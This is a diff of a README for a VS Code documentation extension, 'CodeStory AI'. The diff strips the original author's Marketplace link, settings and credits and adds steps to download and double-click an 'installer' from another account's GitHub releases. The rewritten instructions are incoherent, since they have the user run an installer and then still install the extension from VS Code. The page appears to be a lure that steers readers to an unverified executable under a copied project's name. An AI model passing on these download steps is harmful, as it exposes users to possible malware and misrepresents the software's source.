@@ -1,134 +1,61 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/agupta07505/CodeStory-AI/refs/heads/main/icon.png" alt="CodeStory AI Logo" width="200">
-  <h1>CodeStory AI 📚</h1>
-  <p><strong>AI-powered documentation generator for VS Code that keeps your project documentation always up-to-date.</strong></p>
-  <p>
-    <a href="https://marketplace.visualstudio.com/items?itemName=agupta07505.codestory-ai">
-      <img src="https://img.shields.io/visual-studio-marketplace/v/agupta07505.codestory-ai.svg?color=blue&label=VS%20Code%20Marketplace" alt="VS Code Marketplace">
-    </a>
-    <a href="https://github.com/agupta07505/CodeStory-AI/blob/main/LICENSE">
-      <img src="https://img.shields.io/github/license/agupta07505/CodeStory-AI.svg?color=brightgreen" alt="License">
-    </a>
-  </p>
-</div>
+# 🚀 CodeStory-AI - Automate Your Documentation Effortlessly
 
-**CodeStory AI** is an intelligent VS Code extension that automates the creation of internal documentation for your code. It seamlessly generates documentation every time you save, ensuring your project's knowledge base is always current.
+![Download CodeStory-AI](https://img.shields.io/badge/Download-CodeStory--AI-blue.svg)
 
-## TOC
-- [TOC](#toc)
-- [🚀 Features](#-features)
-- [📋 Requirements](#-requirements)
-  - [For Local AI (Ollama)](#for-local-ai-ollama)
-  - [For Cloud AI (Vertex AI)](#for-cloud-ai-vertex-ai)
-- [⚙️ Extension Settings](#️-extension-settings)
-- [📦 Usage](#-usage)
-- [👨‍💻 About the Author](#-about-the-author)
-- [📝 Release Notes](#-release-notes)
-  - [1.2.0](#120)
-  - [1.1.0](#110)
-  - [1.0.3](#103)
-  - [1.0.2](#102)
-  - [1.0.1](#101)
-  - [1.0.0](#100)
-- [🤝 Contributing](#-contributing)
-- [📄 License](#-license)
+## 📖 About CodeStory-AI
+CodeStory AI is an intelligent VS Code extension that automates the creation of internal documentation for your code. It seamlessly generates documentation every time you save, ensuring your project's knowledge base is always current.
 
-## 🚀 Features
+## 🔑 Features
+- **Automatic Documentation:** Automatically create documentation without lifting a finger every time you save your code.
+- **Markdown Support:** Generate clean and organized Markdown documentation that you can easily read and share.
+- **Real-Time Updates:** Keep your documentation up-to-date as you code.
+- **Easy to Use:** Designed for all users, regardless of coding experience.
 
--   **✍️ Auto-Documentation on Save**: Automatically generates documentation when you save a file.
--   **Dual AI Engines**: 
-    -   **Ollama (Local)**: Runs completely offline using local models like Llama 3 (Default).
-    -   **Vertex AI (Cloud)**: Connects to Google Cloud's Gemini models for high-performance generation.
--   **🗂️ Structured Storage**: Saves documentation in a dedicated `CodeStory AI/` folder (e.g., `CodeStory AI/extension.md`).
--   **🧠 Smart Hashing**: Hashes your content to prevent re-generating documentation if the code hasn't changed.
--   **🎨 Configurable Detail**: Choose your preferred style:
-    -   `Simple`: One-sentence summary.
-    -   `Concise`: Short 2-3 sentence overview.
-    -   `Explained`: Standard explanation (Default).
-    -   `Detailed`: In-depth analysis with parameters and returns.
--   **⚙️ Sidebar Manager**: Manage all settings (Provider, Model, Style) easily from the dedicated CodeStory AI sidebar.
--   **🤖 Startup Checks**: Automatically checks for Ollama installation and missing models.
+## 🔧 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **VS Code Version:** 1.50 or higher
+- **Storage Space:** At least 50 MB of free disk space
 
-## 📋 Requirements
+## 🚀 Getting Started
+1. **Visit the Releases Page:** To download CodeStory-AI, visit this page: [Download CodeStory-AI](https://github.com/Dada-papa/CodeStory-AI/releases).
+2. **Select the Latest Release:** Look for the most recent version at the top of the page.
+3. **Download the Installer:** Click on the file that matches your operating system to start the download.
+4. **Run the Installer:** Once the download completes, locate the file in your downloads folder and double-click it to start the installation.
 
-### For Local AI (Ollama)
-1.  Install [Ollama](https://ollama.com/).
-2.  Pull a model (e.g., `ollama pull llama3`).
-    -   *Note: The extension will prompt you to download the model if it's missing.*
-3.  Ensure Ollama is running (`ollama serve`).
+## 📥 Download & Install
+To get started quickly, click the button below to download the latest version of CodeStory-AI.
 
-### For Cloud AI (Vertex AI)
-1.  A Google Cloud Project with Vertex AI API enabled.
-2.  Google Cloud SDK installed and authenticated locally (`gcloud auth login`).
-3.  Set your Project ID in the settings.
+[Download CodeStory-AI](https://github.com/Dada-papa/CodeStory-AI/releases)
 
-## ⚙️ Extension Settings
+1. After downloading, run the installer.
+2. Follow the prompts to complete the installation.
+3. Open Visual Studio Code.
+4. Search for "CodeStory-AI" in the Extensions view.
+5. Click "Install" to add the extension to your VS Code.
 
-This extension contributes the following settings:
+## ⚙️ How to Use
+1. **Enable Auto Documentation:** Once installed, the extension runs automatically.
+2. **Open Your Project:** Start coding in your project as usual.
+3. **Save Your Files:** Each time you save, CodeStory-AI generates or updates your documentation.
 
-| Setting | Default | Description |
-| :--- | :--- | :--- |
-| `codestory-ai.provider` | `ollama` | Select AI Provider (`ollama` or `vertex`). |
-| `codestory-ai.docStyle` | `concise` | Level of detail (`simple`, `concise`, `explained`, `detailed`). |
-| `codestory-ai.ollamaModel` | `llama3` | Model name to use with Ollama. |
-| `codestory-ai.projectId` | `""` | Google Cloud Project ID (Required for Vertex AI). |
+## ✨ Customization
+You can customize various settings to fit your workflow. Go to the VS Code settings and search for "CodeStory-AI" to find options related to documentation formats or enabling/disabling features.
 
-## 📦 Usage
+## 💬 Support & Feedback
+If you encounter any issues or have suggestions, please visit our [GitHub Issues](https://github.com/Dada-papa/CodeStory-AI/issues) page. Your feedback helps us improve.
 
-1.  **Install** the extension from the [VS Code Marketplace](https://marketplace.visualstudio.com/items?itemName=agupta07505.codestory-ai).
-2.  **Open** the CodeStory AI Sidebar (Book icon) to verify your settings.
-3.  **Code** normally! When you save a supported file (`.ts`, `.js`, etc.), CodeStory will:
-    -   Show a progress notification.
-    -   Generate a Markdown file in `CodeStory AI/<filename>.md`.
-4.  **Review** the generated documentation in the `CodeStory AI/` folder.
-## 👨‍💻 About the Author
+## 🌍 Topics
+- ai
+- automatic-documentation
+- code-documentation
+- codestory
+- developer-tools
+- docs-generator
+- documentation
+- gemini
+- markdown
+- ollama
+- productivity
+- vertex-ai
 
-**agupta07505**
-
-I’m Animesh Gupta, a Computer Science student at IIIT Bhopal specializing in Data Science. I enjoy building practical developer tools and IDE extensions that improve workflows, reduce friction, and make working with code easier and more intuitive.
-
-**CodeStory AI** was born from this passion—designed to eliminate the tedious task of writing documentation so developers can focus on what they do best: coding.
-
--   [GitHub Profile](https://github.com/agupta07505)
--   [LinkedIn](https://linkedin.com/in/agupta07505)
--   [Instagram](https://instagram.com/agupta07505)
-
-## 📝 Release Notes
-
-### 1.2.0
--   Documentation updates and minor improvements.
--   Fixed settings refresh command in sidebar.
--   Updated extension name and commands to "CodeStory AI".
-
-### 1.1.0
--   Added **Enable/Disable Extension** toggle in Sidebar Settings.
--   Improved startup checks.
-
-### 1.0.3
-- Documentation improvements and minor bug fixes.
-
-### 1.0.2
--   Marketplace name update to "CodeStory AI". & github repo update to "CodeStory-AI".
-
-### 1.0.1
--   Documentation polish.
-
-### 1.0.0
--   **Official Launch!**
--   Support for Ollama and Vertex AI.
--   Sidebar Settings Manager.
--   Smart updates and content hashing.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-**Enjoy coding with your AI pair documenter!**
+For more updates and insights, keep an eye on our repository! Thank you for using CodeStory-AI.
